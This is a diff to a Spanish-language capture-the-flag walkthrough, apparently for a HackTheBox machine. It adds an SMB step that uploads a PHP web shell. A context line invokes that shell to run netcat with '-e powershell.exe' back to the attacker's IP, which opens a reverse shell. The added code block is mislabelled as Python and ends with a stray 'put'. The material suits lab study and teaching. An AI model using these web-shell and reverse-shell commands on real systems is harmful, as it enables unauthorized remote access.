@@ -186,7 +186,13 @@ ahora vamos a localizar el binario de netcat para poder subirlo a la maquina
 
 ```
 
-ahora que ya tenemos el binario en nuestra ubicación de trabajo vamos a subirlo al recurso compartido de la misma manera que hemos hecho con los otros archivos
+ahora que ya tenemos el binario en nuestra ubicación de trabajo vamos a subirlo al recurso compartido de la misma manera que hemos hecho con los otros archivos. 
+
+```python
+put shell.php
+
+put
+```
 
 ahora solo debemos cargar los dos archivos y luego podemos ejecutarlo desde la web con el siguiente comando
 `http://school.flight.htb/shell.php?cmd=netcat.exe -e powershell.exe 10.10.14.8 9001`
